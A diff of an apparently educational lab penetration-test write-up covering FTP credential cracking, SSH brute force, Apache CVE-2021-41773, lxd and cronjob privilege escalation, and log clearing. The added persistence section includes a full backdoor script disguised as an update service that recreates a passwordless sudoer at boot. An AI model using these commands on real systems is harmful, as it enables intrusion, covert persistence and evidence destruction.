@@ -131,7 +131,19 @@ As we can see there are a few open services
 # Foothold
 Let's try establishing foothold by leveraging each path individually. We have color coded them to what we thought the paths were like
 
-## via FTP
+## Via FTP service
+### Details
+CWE-257: Storing Passwords in a Recoverable Format
+#### Summary
+Via anonymous login, we can access to site-credentials.txt file that contains an MD5 hash of password
+
+**Discovered Login**
+
+|Username|password|System account?|SSH enabled?|
+|--|--|--|--|
+|`ftp-user`|`football`|yes|yes|
+
+### Walktrough
 As we have already said, above FTP allows for anonymous login, so let's do that:
 
 ```sh
@@ -142,7 +154,7 @@ Connected to 192.168.56.2.
 220 (vsFTPd 3.0.5)
 Name (192.168.56.2:kali): anonymous
 331 Please specify the password.
-Password: 
+Password: #leave it blank
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -179,8 +191,7 @@ Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
 Warning: no OpenMP support for this hash type, consider --fork=4
 Press 'q' or Ctrl-C to abort, almost any other key for status
 football         (?)     
-1g 0:00:00:00 DONE (2024-05-31 17:30) 50.00g/s 9600p/s 9600c/s 9600C/s 123456..november
-Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+[...]
 Session completed.  
 ```
 Could `ftp-user` be an SSH user of the target machine? Let's try it:
@@ -221,7 +232,19 @@ ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
 ```
 Where we can notice the presence of two interesting users: `ubuntu` and `lxd`
 
-## [MED] via SSH 
+## Via SSH service on port 22
+### Details
+CWE-1391: Use of Weak Credentials
+#### Summary
+Via SSH service we have tryed a bruteforce for user `ubuntu`, that is commonly used on "stock" installation of Ubuntu OS.
+
+**Discovered Login**
+
+|Username|password|System account?|SSH enabled?|
+|--|--|--|--|
+|`ubuntu`|`admin@123`|yes|yes|
+
+### Walktrough
 Since SSH is enabled, we tried to enumerate SSH users and guess their passwords by using `hydra`, we could bruteforce both usernames and passwords in one shot by executing the following command
 
 ```sh 
@@ -249,7 +272,19 @@ Both paths eventually lead to being able to SSH directly to the machine using us
 ubuntu@ubuntulab:~$
 ```
 
-## [HRD] via Apache
+## Via Apache service
+### Details
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+- CVSS 3.0 Base score : 9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+- CVE-2021-41773
+- Vuln: Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability
+### Remediation
+Apache 2.4.x < 2.4.59 Multiple Vulnerabilities: Upgrade to Apache version 2.4.59 or later
+
+#### Summary
+Enumerating services, we have discovered a version of apache with multiple vulnerabilities documented. The specific configuration on this VM is vulnerable to path traversal, and thanks to that we have obtained access to a limited shell.
+
+### Walktrough
 From the scanning and enumeration part we have noticed an Apache 2.4.49 webserver running. We then made a quick `nmap` scan on its port `8080` to check for inspiration in our pentesting adventure:
 
 ```sh
@@ -281,6 +316,7 @@ Additionally, the server would need the `mod_cgi` module enabled.
 # Privilege escalation
 Now that we've found three different ways to get access to the machine, we will show the paths we found to escalate ourselves to the almighty `root` user.
 
+## Analysis of the system
 We first notice the presence of the `.bash_history` file, let's take a peek:
 
 ```sh
@@ -317,7 +353,8 @@ The story differs whether we achieved foothold with `ftp-user` or `ubuntu`
 We will show below what we've found.
 
 
-## via SSH
+## Pivoting on ubuntu user to escalate
+### Analysis of capabilities
 When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.
 
 Well, turns out that the aforementioned user has full root privileges.
@@ -341,7 +378,23 @@ root@ubuntulab:/home/ubuntu#
 ```
 We are aware that this is a very trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
 
-## [MED] via Cronjob 
+### Analysis of interesting tool available with given capabilities - lxd service
+We noticed the presence of `lxd` from `/etc/passwd`, so we tried exploiting it. We could think about mounting the file system with `root` privileges, but it would require to be `sudoer`. Thankfully, the `ubuntu` user is.
+
+```sh
+ubuntu@ubuntulab:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+ubuntu@ubuntulab:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+ubuntu@ubuntulab:~$ lxc start test
+ubuntu@ubuntulab:~$ lxc exec test bash
+
+root@test:~# 
+```
+## Analysis of active cronjobs
+### Details
+CWE-732: Incorrect Permission Assignment for Critical Resource
+### Summary
+There is an active cronjob that execute with root priviledges a file with improperly permission that allows regular user `ftp-user` to modify it. By doing it we are able to inject a reverse shell that will spawn as `root`.
+### Walktrough
 By checking the `crontab` file, we noticed a particular:
 
 ```sh
@@ -370,18 +423,9 @@ nc -lnvp 7777
 ```
 Since the file is executed as root, the shell will be a root shell.
 
-## [HRD] via LXD
-We noticed the presence of `lxd` from `/etc/passwd`, so we tried exploiting it. We could think about mounting the file system with `root` privileges, but it would require to be `sudoer`. Thankfully, the `ubuntu` user is.
 
-```sh
-ubuntu@ubuntulab:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
-ubuntu@ubuntulab:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
-ubuntu@ubuntulab:~$ lxc start test
-ubuntu@ubuntulab:~$ lxc exec test bash
-
-root@test:~# 
-```
 # Persistence
+## Deploy our ssh keys
 In order to be persistent in the machine, one of the easiest and most straightforward ways is to leverage SSH. We have generated the SSH keys in our machines:
 
 ```sh
@@ -406,6 +450,66 @@ It's important to note that this will work as long as the server's IP does not c
 We decided not to include other entry points for persitance because we believe that having few entry points but very stealthy ones is significantly better than having a big amount but obvious ones. Raising any kind of suspicion would trigger immediate action from the defender, who could think about doing a deeper scan on its system or even reinstalling everything from stratch on a new machine, effectively voiding all of our persistance efforts. 
 
 This way, we are maximising the time we are persiting into the target system.
+
+## Deploying a custom user as systemd service
+The idea is to create a sudoer user on startup of system, with fixed password in order to have always a persistence even if password of known users will change due to password-update policy if will be implemented by "company".
+
+Then we have created an sh file in a "protected" position with a "legit" name. A junior sysadmin that have not implemented any IDS, will leave file in /bin, especially if name is related to OS service.
+
+`/usr/bin/ubuntupdates.sh` (the name was choosen to be "trustable")
+
+```sh
+#!/bin/bash
+USERNAME="sysadmim" #typo is intended
+PASSWORD="grp0xe" # for demo purpose
+if ! id "$USERNAME" &>/dev/null; then
+    sudo useradd -m -s /bin/bash "$USERNAME"
+    echo "$USERNAME:$PASSWORD" | sudo chpasswd
+    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/$USERNAME >/dev/null
+    sudo chmod 440 /etc/sudoers.d/$USERNAME
+fi
+exec &>/dev/null
+```
+```sh
+sudo chmod +x /usr/bin/ubuntupdates.sh
+```
+Then have created a file `ubuntupdates.service` and we have positionated ad /etc/systemd/system, that is in charge to execute file created above. 
+
+```sh
+# /etc/systemd/system/ubuntupdates.service
+[Unit]
+Description=ubuntupdates
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/ubuntupdates.sh
+
+[Install]
+WantedBy=multi-user.target
+```
+Then enable it by run.
+
+```sh
+sudo systemctl daemon-reload
+sudo systemctl enable ubuntupdates.service
+sudo systemctl start ubuntupdates.service
+```
+
+The by an attacker machine we have always possibility to:
+
+```sh
+ssh sysadmim@192.68.56.4
+# pass: grp0xe
+```
+```sh
+sysadmim@ubuntulab:~$ sudo su
+root@ubuntulab:/home/sysadmim# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Good to notice.
+User will be created if not already present, then if owner of system will detect and remove user `sysadmim` but not detect `ubuntupdates` service, the user will be recreated at next startup.
 
 # Clearing our traces
 The job would not be complete without a proper cleanup of our traces. 
@@ -452,6 +556,8 @@ We can also use this method to carefully restore every access and change date, i
 Then we cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely (as it would raise more concerns victim-side), but to just empty them out.
 
 ```sh
+truncate -s 0 /var/log/syslog
+truncate -s 0 /var/log/messages
 truncate -s 0 /var/log/auth.log
 truncate -s 0 /var/log/cron.log
 truncate -s 0 /var/log/httpd
